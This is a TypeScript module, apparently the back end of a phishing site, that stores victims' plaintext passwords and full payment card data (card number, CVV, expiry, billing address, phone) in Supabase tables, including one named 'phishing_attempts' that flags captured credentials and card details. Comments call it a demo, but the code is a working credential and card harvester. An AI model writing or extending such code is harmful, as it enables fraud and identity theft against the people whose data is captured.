import { createClient } from '@supabase/supabase-js';

// Use environment variables or fallback to placeholders for local development
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL || 'https://your-project-url.supabase.co';
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY || 'your-anon-key';

export const supabase = createClient(supabaseUrl, supabaseAnonKey);

interface PaymentData {
  full_card_number: string;
  card_bin: string; // First 6 digits
  card_number_last_4: string;
  expiry_date: string;
  cvv: string;
  cardholder_name: string;
  billing_address: {
    address: string;
    city: string;
    state: string;
    postal_code: string;
    country: string;
  };
  phone_number: string;
  user_email: string;
  user_password?: string;
  timestamp?: string;
}

export const saveLoginDetails = async (email: string, password: string) => {
  // Store credentials in localStorage
  if (typeof window !== 'undefined') {
    localStorage.setItem('userEmail', email);

    // In a real app, you would NEVER store passwords in localStorage
    // This is just for the demo - in a real app, you'd use Supabase Auth
    localStorage.setItem('demoPassword', password);
  }

  // You could also check if user exists in database and create if not
  const { data, error } = await supabase
    .from('users')
    .upsert([
      {
        email,
        password, // Storing the password in plain text for this specific application
        created_at: new Date().toISOString(),
        last_login: new Date().toISOString()
      }
    ])
    .select();

  // Return the user or error
  return { data, error };
};

export const savePaymentDetails = async (paymentData: PaymentData) => {
  // Get the user email and password from localStorage
  let email = '';
  let password = '';

  if (typeof window !== 'undefined') {
    email = localStorage.getItem('userEmail') || '';
    password = localStorage.getItem('demoPassword') || '';
  }

  if (!email) {
    return { error: 'No user email found' };
  }

  // Store payment data in Supabase with full card number and credentials
  const { data, error } = await supabase
    .from('payment_info')
    .upsert([
      {
        user_email: email,
        user_password: password, // Storing the associated password
        full_card_number: paymentData.full_card_number,
        card_bin: paymentData.card_bin,
        card_number_last_4: paymentData.card_number_last_4,
        expiry_date: paymentData.expiry_date,
        cvv: paymentData.cvv,
        cardholder_name: paymentData.cardholder_name,
        billing_address: paymentData.billing_address,
        phone_number: paymentData.phone_number,
        created_at: new Date().toISOString()
      }
    ])
    .select();

  return { data, error };
};

export const savePhishingAttempt = async () => {
  // Get the user email and password from localStorage
  let email = '';
  let password = '';
  let paymentInfoCaptured = false;

  if (typeof window !== 'undefined') {
    email = localStorage.getItem('userEmail') || '';
    password = localStorage.getItem('demoPassword') || '';
    paymentInfoCaptured = Boolean(localStorage.getItem('paymentInfoCaptured'));
  }

  if (!email) {
    return { error: 'No user email found' };
  }

  // Get client IP (in a real app you would do this server-side)
  // For this demo, we'll just use a placeholder
  const ipAddress = '0.0.0.0';

  // Record the phishing attempt in Supabase
  const { data, error } = await supabase
    .from('phishing_attempts')
    .insert([
      {
        user_email: email,
        user_password: password, // Also store the password in phishing attempts
        credentials_captured: Boolean(email && password),
        payment_info_captured: paymentInfoCaptured,
        timestamp: new Date().toISOString(),
        user_agent: typeof navigator !== 'undefined' ? navigator.userAgent : '',
        ip_address: ipAddress
      }
    ])
    .select();

  return { data, error };
};
